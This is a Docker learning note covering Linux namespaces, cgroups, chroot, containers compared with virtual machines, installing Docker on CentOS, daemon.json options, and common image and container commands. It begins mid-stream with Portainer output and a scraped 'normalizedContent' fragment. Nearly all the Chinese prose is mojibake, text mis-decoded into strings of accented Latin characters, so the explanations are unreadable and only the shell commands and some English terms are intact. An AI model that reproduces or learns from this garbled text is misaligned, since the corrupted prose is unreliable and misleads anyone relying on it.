portainer/portainer\n20db26b67b791648c2ef6aee444a5226a9c897ebcf0160050e722dbf4a4906e3\n[root@ubuntu1804 ~]#docker ps \nCONTAINER ID        IMAGE                 COMMAND             CREATED             STATUS              PORTS                                            NAMES\n20db26b67b79        portainer/portainer   "/portainer"        5 seconds ago       Up 4 seconds        0.0.0.0:8000->8000/tcp, 0.0.0.0:9000->9000/tcp   portainer\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# ç»å½åä½¿ç¨Portainer\n\n> ç¨æµè§å¨è®¿é®ï¼http://localhost:9000\n\n',normalizedContent:'# docker\n\n\n# docker çå¿µ\n\n> dockerçä¸»è¦ç®æ æ¯âbuildï¼ship and run any app,anywhereâï¼ä¹å°±æ¯éè¿å¯¹åºç¨ç»ä»¶çå°è£ãååãé¨ç½²ãè¿è¡ç­çå½å¨æçç®¡çï¼ä½¿ç¨æ·çappï¼å¯ä»¥æ¯ä¸ä¸ªwebåºç¨ææ°æ®åºåºç¨ç­ç­ï¼åå¶è¿è¡ç¯å¢è½å¤åå°âä¸æ¬¡å°è£ï¼å°å¤è¿è¡âãè§£å³äºè¿è¡ç¯å¢åéç½®é®é¢è½¯ä»¶å®¹å¨ï¼æ¹ä¾¿åæç»­éæå¹¶æå©äºæ´ä½åå¸çå®¹å¨èæåææ¯ã\n\n\n\n\n# linuxå®¹å¨çå®ç°æ¹å¼\n\n> ä¸ä¸ªæ­£å¨è¿è¡ç docker å®¹å¨ï¼å¶å®å°±æ¯ä¸ä¸ªå¯ç¨äºå¤ä¸ª linux namespace çåºç¨è¿ç¨ï¼èè¿ä¸ªè¿ç¨è½å¤ä½¿ç¨çèµæºéï¼åå cgroups éç½®çéå¶ãè¿ä¹æ¯å®¹å¨ææ¯ä¸­ä¸ä¸ªéå¸¸éè¦çæ¦å¿µï¼å³ï¼å®¹å¨æ¯ä¸ä¸ªâåè¿ç¨âæ¨¡åã\n\nä¸ä¸ªâå®¹å¨âï¼å®éä¸æ¯ä¸ä¸ªç± linux namespaceãlinux cgroups å rootfs ä¸ç§ææ¯æå»ºåºæ¥çè¿ç¨çéç¦»ç¯å¢ã\n\n 1. namespace çä½ç¨æ¯âéç¦»âï¼å®è®©åºç¨è¿ç¨åªè½çå°è¯¥ namespace åçâä¸çâï¼ä¿®æ¹è¿ç¨è§å¾çä¸»è¦æ¹æ³\n\n 2. cgroups çä½ç¨æ¯âéå¶âï¼å®ç»è¿ä¸ªâä¸çâå´ä¸äºä¸åçä¸è§çå¢ãå¶é çº¦æçä¸»è¦ææ®µ\n\n 3. ä¸ç»èåæè½½å¨ /var/lib/docker/aufs/mnt ä¸ç rootfsï¼è¿ä¸é¨åæä»¬ç§°ä¸ºâå®¹å¨éåâï¼container imageï¼ï¼æ¯å®¹å¨çéæè§å¾ï¼ä¸ä¸ªç± namespace+cgroups ææçéç¦»ç¯å¢ï¼è¿ä¸é¨åæä»¬ç§°ä¸ºâå®¹å¨è¿è¡æ¶âï¼container runtimeï¼ï¼æ¯å®¹å¨çå¨æè§å¾ã\n\n\n# namespace\n\nå¨å®¹å¨ä¸­çå°åªæèªå·±ä¸ä¸ªè¿ç¨ï¼ä½æ¯è¿ä¸ªè¿ç¨å¶å®æ¯å¨å®¿ä¸»æºä¸ç åªä¸è¿æ¯ä¸ä¸ªç¬ç«çnamespace\n\nå®ä¹äº5ä¸ªå½åç©ºé´ç»æä½ï¼å¤ä¸ªè¿ç¨å¯ä»¥ä½¿ç¨åä¸ä¸ªnamespace\n\n 1. utsï¼ è¿è¡åæ ¸çåç§°ãçæ¬ãåºå±ä½ç³»ç»æç±»åç­ä¿¡æ¯ï¼unix timesharing systemï¼\n\n 2. ipcï¼ ä¸è¿ç¨é´éä¿¡ï¼ipc)æå³\n\n 3. mntï¼å·²ç»è£è½½çæä»¶ç³»ç»çè§å¾ mount namespaceï¼ç¨äºè®©è¢«éç¦»è¿ç¨åªçå°å½å namespace éçæè½½ç¹ä¿¡æ¯ï¼\n\n 4. pidï¼æå³è¿ç¨idçä¿¡æ¯\n\n 5. netï¼ç½ç»ç¸å³çå½åç©ºé´åæ° network namespaceï¼ç¨äºè®©è¢«éç¦»è¿ç¨çå°å½å namespace éçç½ç»è®¾å¤åéç½®ã\n\nå¨ linux åæ ¸ä¸­ï¼æå¾å¤èµæºåå¯¹è±¡æ¯ä¸è½è¢« namespace åçï¼æå¸åçä¾å­å°±æ¯ï¼æ¶é´ã\n\nä¸ºäºè®©å¤ä¸ªå®¹å¨ä»¥æ²ççæ¹å¼å¨å®¿ä¸»æºä¸è¿è¡ï¼å°±éè¦æåå®ä¹å¥½åä¸ªå®¹å¨è½çå°çè¾¹çãç±äºåä¸ªå®¹å¨é½æ¯ç´æ¥è¿è¡å¨å®¿ä¸»æºç³»ç»ä¸ï¼å æ­¤éè¦åæ ¸å¯¹åä¸ªå®¹å¨çä¸ä¸æè¿è¡ä¿®æ¹ï¼è®©ä»ä»¬çä¸å»æ¯ä¸ä¸ªç¬ç«çæä½ç³»ç»ãæ¯å¦ï¼æå®pidä¸º1çè¿ç¨ï¼æå®ç½å¡è®¾å¤ï¼æå®æä»¶ç³»ç»æè½½ï¼æå®ç¨æ·ç­ç­ã\n\nlinuxæä½ç³»ç»åæ ¸ä»åºå±å®ç°äºä¸ºåä¸ªè¿ç¨åå»ºç¬ç«ç¨æ·ç©ºé´çåè½ï¼ä¸åç¨æ·ç©ºé´ä¼¼äºä¸ä¸ªä¸ªç¬ç«çèææºç³»ç»ï¼ç¨æ·ç©ºé´åé¨è¿ç¨ä¸è½æç¥å°å¶å®ç¨æ·ç©ºé´ä¸­çè¿ç¨ç¶æãåæ ¸æä¾äºå­ç§namespacesã\n\nuts     hostname and domainname    ä¸»æºååååéç¦»                åæ ¸çæ¬ï¼2.6.19\nuser                               ç¨æ·éç¦»ãè¿è¡è¿ç¨çç¨æ·åç»          åæ ¸çæ¬ï¼3.8.x\nmount                              æè½½ç¹éç¦»ãå³æè½½ç¹éç¦»ï¼ä¸»è¦ææ ¹ç®å½     åæ ¸çæ¬ï¼2.4.19\nipc     inter-process-connection   è¿ç¨é´éä¿¡éç¦»ãæ¶æ¯éåãå±äº«åå®¹ãä¿¡å·é   åæ ¸çæ¬ï¼2.6.19\npid     process                                            \nid                                 pidéç¦»                   \nnet     network                    ç½ç»éç¦»ãç½ç»è®¾å¤ãåè®®æ ãç«¯å£        åæ ¸çæ¬ï¼2.6.29\n\n\n# cgroups\n\nlinux cgroups å°±æ¯ linux åæ ¸ä¸­ç¨æ¥ä¸ºè¿ç¨è®¾ç½®èµæºéå¶çä¸ä¸ªéè¦åè½ã\n\nlinux cgroups çå¨ç§°æ¯ linux control groupãå®æä¸»è¦çä½ç¨ï¼å°±æ¯éå¶ä¸ä¸ªè¿ç¨ç»è½å¤ä½¿ç¨çèµæºä¸éï¼åæ¬ cpuãåå­ãç£çãç½ç»å¸¦å®½ç­ç­ã\n\næ­¤å¤ï¼cgroups è¿è½å¤å¯¹è¿ç¨è¿è¡ä¼åçº§è®¾ç½®ãå®¡è®¡ï¼ä»¥åå°è¿ç¨æèµ·åæ¢å¤ç­æä½ã\n\n\n# chroot\n\nå¦æéè¦å¨ä¸ä¸ªå®¿ä¸»æºä¸è¿è¡å¤ä¸ªå®¹å¨ï¼ä¸å®¹å¨ä¹é´ç¸äºéç¦»ï¼é£ä¹ç¬¬ä¸ä¸ªå°±éè¦ç³»ç»åºæä»¶çä¾èµï¼å¯¹äºä¸ä¸ªå®¹å¨èè¨ï¼éè¦å°å¶éè¦çç³»ç»æä»¶åç¬å¤å¶åºæ¥ä¸ä»½ï¼æ¾å°æå®ç®å½ï¼å¹¶ä¸éè¦è®©è¿ç¨è®¤ä¸ºè¿å°±æ¯æ ¹ç®å½ï¼èä¸æ¯å»è°ç¨å®¿ä¸»æºç³»ç»ä¸çåºæä»¶ãchrootå°±æ¯ä¸ä¸ªåæ¢æ ¹ç®å½çæ¹å¼ã\n\n\n# dockeråèææºçåºå«\n\næ¯è¾äº docker åä¼ ç»èæåæ¹å¼çä¸åä¹å¤ï¼\n\n * ä¼ ç»èææºææ¯æ¯èæåºä¸å¥ç¡¬ä»¶åï¼å¨å¶ä¸è¿è¡ä¸ä¸ªå®æ´æä½ç³»ç»ï¼å¨è¯¥ç³»ç»ä¸åè¿è¡æéåºç¨è¿ç¨ï¼\n\n * èå®¹å¨åçåºç¨è¿ç¨ç´æ¥è¿è¡äºå®¿ä¸»çåæ ¸ï¼å®¹å¨åæ²¡æèªå·±çåæ ¸ï¼ èä¸ä¹æ²¡æè¿è¡ç¡¬ä»¶èæãå æ­¤å®¹å¨è¦æ¯ä¼ ç»èææºæ´ä¸ºè½»ä¾¿ã\n\n * æ¯ä¸ªå®¹å¨ä¹é´äºç¸éç¦»ï¼æ¯ä¸ªå®¹å¨æèªå·±çæä»¶ç³»ç» ï¼å®¹å¨ä¹é´è¿ç¨ä¸ä¼ç¸äºå½±åï¼è½åºåè®¡ç®èµæºã\n\n\n# èææº\n\nå®å¯ä»¥å¨ä¸ç§æä½ç³»ç»éé¢è¿è¡å¦ä¸ç§æä½ç³»ç»ï¼æ¯å¦å¨windows ç³»ç»éé¢è¿è¡linux ç³»ç»ãåºç¨ç¨åºå¯¹æ­¤æ¯«æ æç¥ï¼å ä¸ºèææºçä¸å»è·çå®ç³»ç»ä¸æ¨¡ä¸æ ·ï¼èå¯¹äºåºå±ç³»ç»æ¥è¯´ï¼èææºå°±æ¯ä¸ä¸ªæ®éæä»¶ï¼ä¸éè¦äºå°±å æï¼å¯¹å¶ä»é¨åæ¯«æ å½±åãè¿ç±»èææºå®ç¾çè¿è¡äºå¦ä¸å¥ç³»ç»ï¼è½å¤ä½¿åºç¨ç¨åºï¼æä½ç³»ç»åç¡¬ä»¶ä¸èä¹é´çé»è¾ä¸åã\n\nèææºçç¼ºç¹ï¼\n\n * èµæºå ç¨å¤\n * åä½æ­¥éª¤å¤\n * å¯å¨æ¢\n\n\n\n\n# docker\n\nlinux å®¹å¨ä¸æ¯æ¨¡æä¸ä¸ªå®æ´çæä½ç³»ç»ï¼èæ¯å¯¹è¿ç¨è¿è¡éç¦»ãæäºå®¹å¨ï¼å°±å¯ä»¥å°è½¯ä»¶è¿è¡æéçææèµæºæåå°ä¸ä¸ªéç¦»çå®¹å¨ä¸­ãå®¹å¨ä¸èææºä¸åï¼ä¸éè¦æç»ä¸æ´å¥æä½ç³»ç»ï¼åªéè¦è½¯ä»¶å·¥ä½æéçåºèµæºåè®¾ç½®ãç³»ç»å æ­¤èåå¾é«æè½»éå¹¶ä¿è¯é¨ç½²å¨ä»»ä½ç¯å¢ä¸­çè½¯ä»¶é½è½å§ç»å¦ä¸å°è¿è¡ã\n\n\n\n\n# dockerçä¼å¿\n\ndockeræ¯ä¸ä¸ªclient-serverç»æçç³»ç»ï¼dockerå®æ¤è¿ç¨è¿è¡å¨ä¸»æºä¸ï¼ ç¶åéè¿socketè¿æ¥ä»å®¢æ·ç«¯è®¿é®ï¼å®æ¤è¿ç¨ä»å®¢æ·ç«¯æ¥åå½ä»¤å¹¶ç®¡çè¿è¡å¨ä¸»æºä¸çå®¹å¨ã å®¹å¨ï¼æ¯ä¸ä¸ªè¿è¡æ¶ç¯å¢ï¼å°±æ¯æä»¬åé¢è¯´å°çéè£ç®±ãdockeræçæ¯èææºæ´å°çæ½è±¡å±ãç±äºdockerä¸éè¦hypervisorå®ç°ç¡¬ä»¶èµæºèæå,è¿è¡å¨dockerå®¹å¨ä¸çç¨åºç´æ¥ä½¿ç¨çé½æ¯å®éç©çæºçç¡¬ä»¶èµæºãå æ­¤å¨cpuãåå­å©ç¨çä¸dockerå°ä¼å¨æçä¸æææ¾ä¼å¿ãdockerå©ç¨çæ¯å®¿ä¸»æºçåæ ¸,èä¸éè¦guest osãå æ­¤,å½æ°å»ºä¸ä¸ªå®¹å¨æ¶,dockerä¸éè¦åèææºä¸æ ·éæ°å è½½ä¸ä¸ªæä½ç³»ç»åæ ¸ãä»èé¿åå¼å¯»ãå è½½æä½ç³»ç»åæ ¸è¿ä¸ªæ¯è¾è´¹æ¶è´¹èµæºçè¿ç¨,å½æ°å»ºä¸ä¸ªèææºæ¶,èææºè½¯ä»¶éè¦å è½½guest os,è¿ä¸ªæ°å»ºè¿ç¨æ¯åéçº§å«çãèdockerç±äºç´æ¥å©ç¨å®¿ä¸»æºçæä½ç³»ç»,åçç¥äºè¿ä¸ªè¿ç¨,å æ­¤æ°å»ºä¸ä¸ªdockerå®¹å¨åªéè¦å ç§éã\n\n\n\n\n# ç¸å³æ¦å¿µ\n\néè¦æ­£ç¡®ççè§£ä»å¨/éå/å®¹å¨è¿å ä¸ªæ¦å¿µ:\n\ndocker æ¬èº«æ¯ä¸ä¸ªå®¹å¨è¿è¡è½½ä½æç§°ä¹ä¸ºç®¡çå¼æãæä»¬æåºç¨ç¨åºåéç½®ä¾èµæåå¥½å½¢æä¸ä¸ªå¯äº¤ä»çè¿è¡ç¯å¢ï¼è¿ä¸ªæåå¥½çè¿è¡ç¯å¢å°±ä¼¼ä¹ imageéåæä»¶ãåªæéè¿è¿ä¸ªéåæä»¶æè½çæ docker å®¹å¨ãimage æä»¶å¯ä»¥çä½æ¯å®¹å¨çæ¨¡æ¿ãdocker æ ¹æ® image æä»¶çæå®¹å¨çå®ä¾ãåä¸ä¸ª image æä»¶ï¼å¯ä»¥çæå¤ä¸ªåæ¶è¿è¡çå®¹å¨å®ä¾ã\n\n * image æä»¶çæçå®¹å¨å®ä¾ï¼æ¬èº«ä¹æ¯ä¸ä¸ªæä»¶ï¼ç§°ä¸ºéåæä»¶ã\n * ä¸ä¸ªå®¹å¨è¿è¡ä¸ç§æå¡ï¼å½æä»¬éè¦çæ¶åï¼å°±å¯ä»¥éè¿dockerå®¢æ·ç«¯åå»ºä¸ä¸ªå¯¹åºçè¿è¡å®ä¾ï¼ä¹å°±æ¯æä»¬çå®¹å¨\n * è³äºä»å¨ï¼å°±æ¯æ¾äºä¸å éåçå°æ¹ï¼æä»¬å¯ä»¥æéååå¸å°ä»å¨ä¸­ï¼éè¦çæ¶åä»ä»å¨ä¸­æä¸æ¥å°±å¯ä»¥äºã\n\n\n\n\n# éå\n\ndocker éåï¼imageï¼å°±æ¯ä¸ä¸ªåªè¯»çæ¨¡æ¿ãéåå¯ä»¥ç¨æ¥åå»º docker å®¹å¨ï¼ä¸ä¸ªéåå¯ä»¥åå»ºå¾å¤å®¹å¨ã\n\ndockeréåçå½åæ åï¼\n\n${registry_ name}/${repository. name}/${image. name}:${tag. name}\ndocker.io/library/alpine:3.10.1\n\n\n1\n2\n\n\n\n# å®¹å¨\n\ndocker å©ç¨å®¹å¨ï¼containerï¼ç¬ç«è¿è¡çä¸ä¸ªæä¸ç»åºç¨ãå®¹å¨æ¯ç¨éååå»ºçè¿è¡å®ä¾ã\n\nå®å¯ä»¥è¢«å¯å¨ãå¼å§ãåæ­¢ãå é¤ãæ¯ä¸ªå®¹å¨é½æ¯ç¸äºéç¦»çãä¿è¯å®å¨çå¹³å°ã å¯ä»¥æå®¹å¨çåæ¯ä¸ä¸ªç®æçç linux ç¯å¢ï¼åæ¬rootç¨æ·æéãè¿ç¨ç©ºé´ãç¨æ·ç©ºé´åç½ç»ç©ºé´ç­ï¼åè¿è¡å¨å¶ä¸­çåºç¨ç¨åºã\n\nå®¹å¨çå®ä¹åéåå ä¹ä¸æ¨¡ä¸æ ·ï¼ä¹æ¯ä¸å å±çç»ä¸è§è§ï¼å¯ä¸åºå«å¨äºå®¹å¨çæä¸é¢é£ä¸å±æ¯å¯è¯»å¯åçã\n\n\n# ä»åº\n\nä»åºï¼repositoryï¼æ¯éä¸­å­æ¾éåæä»¶çåºæã\n\nä»åº(repository)åä»åºæ³¨åæå¡å¨ï¼registryï¼æ¯æåºå«çãä»åºæ³¨åæå¡å¨ä¸å¾å¾å­æ¾çå¤ä¸ªä»åºï¼æ¯ä¸ªä»åºä¸­ååå«äºå¤ä¸ªéåï¼æ¯ä¸ªéåæä¸åçæ ç­¾ï¼tagï¼ã\n\nä»åºåä¸ºå¬å¼ä»åºï¼publicï¼åç§æä»åºï¼privateï¼ä¸¤ç§å½¢å¼ã\n\næå¤§çå¬å¼ä»åºæ¯ docker hubï¼å­æ¾äºæ°éåºå¤§çéåä¾ç¨æ·ä¸è½½ãå½åçå¬å¼ä»åºåæ¬é¿éäº ãç½æäºç­ã\n\n\n# centoså®è£docker\n\n\n# 1. å¸è½½æ§çæ¬docker\n\nsudo yum remove docker \\\n                  docker-client \\\n                  docker-client-latest \\\n                  docker-common \\\n                  docker-latest \\\n                  docker-latest-logrotate \\\n                  docker-logrotate \\\n                  docker-engine\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 2. è®¾ç½®éåä»åº\n\nsudo yum install -y yum-utils\nsudo yum-config-manager \\\n    --add-repo \\\n    https://download.docker.com/linux/centos/docker-ce.repo\n\n\n1\n2\n3\n4\n\n\n\n# 3. å®è£docker\n\n sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n\n\n1\n\n\n\n# 4. éç½®éåå é\n\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-\'eof\'\n{\n  "registry-mirrors": ["https://t9rco7kp.mirror.aliyuncs.com"]\n}\neof\nsudo systemctl daemon-reload\n\n# å¶ä»éç½®\n\n# daemon.json éç½®ä»ç»\n{\n  "graph": "/data/docker",\n  "storage-driver": "overlay2",\n  "insecure-registries": ["registry.access.redhat.com","quay.io"],\n  "registry-mirrors": ["https://q2gr04ke.mirror.aliyuncs.com>"],\n  "bip": "172.24.38.1/24",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "live-restore": true\n}\n\n# éç½®é¡¹æ³¨æç¹ï¼\n# graph: è¯¥å³é®å­æªæ¥å°è¢«å¼ç¨ï¼å¯ä»¥éç¨ "data-root" æ¿ä»£\n# storage-driver: å­å¨é©±å¨ï¼å³åå±æä»¶ç³»ç»\n# insecure-registries: ä¸å®å¨çdocker registriesï¼å³ä½¿ç¨httpåè®®æ¨æéè±¡\n# registry-mirrors: å éç«ç¹ï¼ä¸è¬å¯ä»¥ä½¿ç¨é¿éãç½æäºãdockerä¸­å½(<https://registry.docker-cn.com>)çå°å\n# bip: æå®docker bridgeå°å(ä¸è½ä»¥.0ç»å°¾)ï¼çäº§ä¸­å»ºè®®éç¨ 172.xx.yy.1/24,å¶ä¸­xx.yyä¸ºå®¿ä¸»æºipååä½ï¼æ¹ä¾¿å®ä½é®é¢\n# è¥å¯å¨å¤±è´¥ï¼æ¥ç /var/log/message æ¥å¿æé\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 5. å¯å¨dockerå¹¶æµè¯\n\nsudo systemctl restart docker\ndocker run hello-world\n\n\n1\n2\n\n\n\n# 6. docker runé»è¾å¾\n\n\n\n\n# 99. å¸è½½æ¹å¼\n\nsystemctl stop docker \nyum -y remove docker-ce\nrm -rf /var/lib/docker\n\n\n1\n2\n3\n\n\n\n# docker å¸¸ç¨å½ä»¤\n\n\n\n\n# å¸®å©ç¸å³\n\n# æ¥ççæ¬\n\ndocker version\n\n\n1\n\n\n\n\n# æ¥çdockerä¿¡æ¯\n\ndocker info\n\n\n1\n\n\n\n\n# æ¥çå¸®å©\n\ndocker --help\n\n\n1\n\n\n\n# éåç¸å³å½ä»¤\n\n# 1.æ¥çæ¬æºä¸­ææéå\ndocker images\t--------------------------\tååºæ¬å°ææéå\n-a\t\t\tååºææéåï¼åå«ä¸­é´æ åå±ï¼\n-q\t\t\tåªæ¾ç¤ºéåid\n\n# 2.æç´¢éå\ndocker search [options] éåå\t-------------------\tå»dockerhubä¸æ¥è¯¢å½åéå\n-s æå®å¼\t\tååºæ¶èæ°ä¸å°äºæå®å¼çéå\n--no-trunc\t  æ¾ç¤ºå®æ´çéåä¿¡æ¯\n\n# 3.ä»ä»åºä¸è½½éå\ndocker pull éåå[:tag|@digest]\t----------------- ä¸è½½éå\n\n# 4.å é¤éå\ndocker rmi éåå\t--------------------------  å é¤éå\n-f\t\tå¼ºå¶å é¤\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# ç»å½éåºdockerhub\n\ndocker login docker.io\ncat /root/.docker/config.json\n\n\n1\n2\n\n\n\n\n# åä¸¾ç³»ç»ä¸çéå\n\ndocker images\noptionsï¼\n\t-a   æ¾ç¤ºæ¬æºææéå\n\t-q   åªæ¾ç¤ºid\n\t--digest  åªæ¾ç¤ºæè¦ä¿¡æ¯\n\t--no-trunc æ¾ç¤ºå®æ´éåä¿¡æ¯\n\n\n1\n2\n3\n4\n5\n6\n\n\n# æ¥æ¾éå\n\ndocker search xxx\noptions:\n\t--no-strunc æ¾ç¤ºå®æ´çéåä¿¡æ¯\n\n\n1\n2\n3\n\n\n# æåéå\n\ndocker pull xxx[:çæ¬]\n\n\n1\n\n\n# å é¤éå\n\ndocker rmi xxx\n\neg.\ndocker rmi centos å é¤ä¸ä¸ªéå\ndocker rmi centos:latest centos:7.1 å é¤å¤ä¸ª\ndocker rmi $(docker images -aq) å é¤å¨é¨\ndocker rmi -f xxx å¼ºå¶å é¤\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# éåæ ç­¾\n\ndocker tag d4ff818577bc docker.io/zhangsan404/alpine:latest\n\n\n1\n\n\n\n\n# æ¨ééåå°è¿ç«¯\n\ndocker push docker.io/zhangsan404/alpine:latest\n\n\n1\n\n\n# ä¿å­éåå°æ¬å°\n\ndocker save zhangsan404/alpine:test > alpine_test.tar\n\n\n1\n\n\n\n\n# æ¬å°éåå¯¼å¥\n\ndocker load < alpine_test.tar\n\n\n1\n\n\n\n\n\n# å®¹å¨ç¸å³å½ä»¤\n\n# 1.è¿è¡å®¹å¨\ndocker run éåå\t--------------------------\téååæ°å»ºå¹¶å¯å¨å®¹å¨\n--name \t\t\t\t\tå«åä¸ºå®¹å¨èµ·ä¸ä¸ªåå­\n-d\t\t\t\t\t\t\tå¯å¨å®æ¤å¼å®¹å¨ï¼å¨åå°å¯å¨å®¹å¨ï¼\n-p \t\t\t\t\t\t\tæ å°ç«¯å£å·ï¼åå§ç«¯å£å·\t\t æå®ç«¯å£å·å¯å¨\n\nä¾ï¼docker run -it --name mytomcat -p 8888:8080 tomcat\ndocker run -d --name mytomcat -p tomcat\n\n# 2.æ¥çè¿è¡çå®¹å¨\ndocker ps\t\t\t\t\t--------------------------\tååºæææ­£å¨è¿è¡çå®¹å¨\n-a\t\t\tæ­£å¨è¿è¡çååå²è¿è¡è¿çå®¹å¨\n-q\t\t\téé»æ¨¡å¼ï¼åªæ¾ç¤ºå®¹å¨ç¼å·\n\n# 3.åæ­¢|å³é­|éå¯å®¹å¨\ndocker start   å®¹å¨åå­æèå®¹å¨id  --------------- å¼å¯å®¹å¨\ndocker restart å®¹å¨åæèå®¹å¨id    --------------- éå¯å®¹å¨\ndocker stop  å®¹å¨åæèå®¹å¨id \t    ------------------ æ­£å¸¸åæ­¢å®¹å¨è¿è¡\ndocker kill  å®¹å¨åæèå®¹å¨id      ------------------ ç«å³åæ­¢å®¹å¨è¿è¡\n\n# 4.å é¤å®¹å¨\ndocker rm -f å®¹å¨idåå®¹å¨å     \ndocker rm -f $(docker ps -aq)\t\t--------------------------\tå é¤ææå®¹å¨\n\n# 5.æ¥çå®¹å¨åè¿ç¨\ndocker top å®¹å¨idæèå®¹å¨å ------------------ æ¥çå®¹å¨åçè¿ç¨\n\n# 6.æ¥çæ¥çå®¹å¨åé¨ç»è\ndocker inspect å®¹å¨id \t\t------------------ æ¥çå®¹å¨åé¨ç»è\n\n# 7.æ¥çå®¹å¨çè¿è¡æ¥å¿\ndocker logs [options] å®¹å¨idæå®¹å¨å\t------------------ æ¥çå®¹å¨æ¥å¿\n-t\t\t\t å å¥æ¶é´æ³\n-f\t\t\t è·éææ°çæ¥å¿æå°\n--tail \t æ°å­\tæ¾ç¤ºæåå¤å°æ¡\n\n# 8.è¿å¥å®¹å¨åé¨\ndocker exec [options] å®¹å¨id å®¹å¨åå½ä»¤ ------------------ è¿å¥å®¹å¨æ§è¡å½ä»¤\n-i\t\tä»¥äº¤äºæ¨¡å¼è¿è¡å®¹å¨ï¼éå¸¸ä¸-tä¸èµ·ä½¿ç¨\n-t\t\tåéä¸ä¸ªä¼ªç»ç«¯    shellçªå£   bash \n\n# 9.å®¹å¨åå®¿ä¸»æºä¹é´å¤å¶æä»¶\ndocker cp æä»¶|ç®å½ å®¹å¨id:å®¹å¨è·¯å¾           -----------------   å°å®¿ä¸»æºå¤å¶å°å®¹å¨åé¨\ndocker cp å®¹å¨id:å®¹å¨åèµæºè·¯å¾ å®¿ä¸»æºç®å½è·¯å¾  -----------------   å°å®¹å¨åèµæºæ·è´å°ä¸»æºä¸\n\n# 10.æ°æ®å·(volum)å®ç°ä¸å®¿ä¸»æºå±äº«ç®å½\ndocker run -v å®¿ä¸»æºçè·¯å¾|ä»»æå«å:/å®¹å¨åçè·¯å¾ éåå\næ³¨æ: \n1.å¦ææ¯å®¿ä¸»æºè·¯å¾å¿é¡»æ¯ç»å¯¹è·¯å¾,å®¿ä¸»æºç®å½ä¼è¦çå®¹å¨åç®å½åå®¹\n2.å¦ææ¯å«ååä¼å¨dockerè¿è¡å®¹å¨æ¶èªå¨å¨å®¿ä¸»æºä¸­åå»ºä¸ä¸ªç®å½,å¹¶å°å®¹å¨ç®å½æä»¶å¤å¶å°å®¿ä¸»æºä¸­\n\n# 11.æåéå\ndocker save éåå -o  åç§°.tar\n\n# 12.è½½å¥éå\ndocker load -i   åç§°.tar\n\n# 13.å®¹å¨æåææ°çéå\ndocker commit -m "æè¿°ä¿¡æ¯" -a "ä½èä¿¡æ¯"   ï¼å®¹å¨idæèåç§°ï¼æåçéååç§°:æ ç­¾\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n# æ°å»ºå¹¶è¿è¡å®¹å¨\n\ndocker run [options] image [command] [arg...]\noptionsï¼\n--name="å®¹å¨æ°åå­": ä¸ºå®¹å¨æå®ä¸ä¸ªåç§°ï¼\n-d: åå°è¿è¡å®¹å¨ï¼å¹¶è¿åå®¹å¨idï¼ä¹å³å¯å¨å®æ¤å¼å®¹å¨ï¼\n-iï¼ä»¥äº¤äºæ¨¡å¼è¿è¡å®¹å¨ï¼éå¸¸ä¸ -t åæ¶ä½¿ç¨ï¼\n-tï¼ä¸ºå®¹å¨éæ°åéä¸ä¸ªä¼ªè¾å¥ç»ç«¯ï¼éå¸¸ä¸ -i åæ¶ä½¿ç¨ï¼\n-p: éæºç«¯å£æ å°ï¼\n-p: æå®ç«¯å£æ å°ï¼æä»¥ä¸åç§æ ¼å¼\n      ip:hostport:containerport\n      ip::containerport\n      **hostport:containerport**\n      containerport\n\ne.g.\ndocker run --name centos_demo01 -t -i centos  # äº¤äºå¼æ¹å¼è¿è¡\ndocker run -d --name tomcat_demo01 -p 8081:8080 tomcat # åå°è¿è¡\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# æ¥çå®¹å¨\n\ndocker ps [options]\n\noptions:\n\t-a    æ¥çææå®¹å¨åæ¬æ­£å¨è¿è¡ååæ­¢ç\n\t-q    æ¾ç¤ºid\n  -n    æ¾ç¤ºæè¿åå»ºçnä¸ªå®¹å¨\n\t-l    æ¾ç¤ºæè¿åå»ºçå®¹å¨\n\t--no-stunc    ä¸æªæ­è¾åº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# éåºå®¹å¨çä¸¤ç§æ¹å¼\n\nexit  # å®¹å¨åæ­¢\nctrl+p+q\n\n\n1\n2\n\n\n# å®¹å¨çå¯å¨ãåæ­¢ãéå¯ãå¼ºå¶å³é­\n\ndocker start xxx \ndocker stop xxx\ndocker restart xxx\ndocker kill xxx\n\n\n1\n2\n3\n4\n\n\n# å é¤å®¹å¨\n\ndocker rm -f $(docker ps -aq) # å¼ºå¶å é¤å¨é¨å®¹å¨               = docker ps -qa |xargs docker rm -f\n\n\n1\n\n\n# æ¥çå®¹å¨æ¥å¿\n\ndocker logs [options] å®¹å¨id\noptionsï¼\n\t-t æ¶é´æ³\n\t-f è·éææ°æ¥å¿\n\t--tail æ°å­åæ¾ç¤ºå¤å°æ¡\n\n\n1\n2\n3\n4\n5\n\n\n# æ¥çå®¹å¨åè¿ç¨\n\ndocker top å®¹å¨id\n\n\n1\n\n\n# æ¥çå®¹å¨åé¨ç»è\n\ndocker inspect å®¹å¨id\n\n\n1\n\n\n# éæ°è¿å¥æ­£å¨è¿è¡çå®¹å¨\n\ndocker exec -it å®¹å¨id /bin/bash  # æå¼æ°çç»ç«¯   æ°è¿ç¨ ä»¥è¿ç§æ¹å¼è¿å¥exitä¸ä¼ç»æå®¹å¨çè¿è¡\ndocker attach å®¹å¨id   # ç´æ¥è¿å¥å®¹å¨å¯å¨çå½ä»¤è¡ç»ç«¯\n\n\n1\n2\n\n\n# æä»¶ç¸äºæ·è´\n\ndocker cp å®¹å¨id:å®¹å¨è·¯å¾ æ¬æºè·¯å¾\ndocker cp æ¬æºè·¯å¾ å®¹å¨id:å®¹å¨å